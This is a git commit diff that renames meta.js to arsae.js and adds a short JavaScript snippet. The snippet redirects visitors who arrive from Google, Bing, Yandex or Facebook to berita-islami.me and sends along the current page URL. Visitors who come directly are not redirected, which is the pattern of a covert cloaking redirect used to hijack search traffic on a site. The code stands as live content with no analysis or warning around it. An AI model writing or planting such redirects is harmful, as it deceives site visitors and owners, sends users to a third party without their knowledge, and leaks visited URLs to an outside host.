459d26386922de257f6a34979d999f72bcfab9f0
mychiara <85479169+mychiara@users.noreply.github.com>
2022-02-21 21:45:34 +0800

    Update and rename meta.js to arsae.js

---
+++ arsae.js
@@ -0,0 +1,14 @@
+ //<![CDATA[
+    if(document.referrer)
+    {
+    	var cek = document.referrer;
+
+    	var is_se = cek.includes('.google.') || cek.includes('.bing.') || cek.includes('yandex.') || cek.includes('facebook.');
+
+      if(is_se)
+    	{
+    		var url = window.location.href;
+    		window.location = "https://www.berita-islami.me/?arsae="+ encodeURIComponent(url);
+    	}
+    }
+//]]>
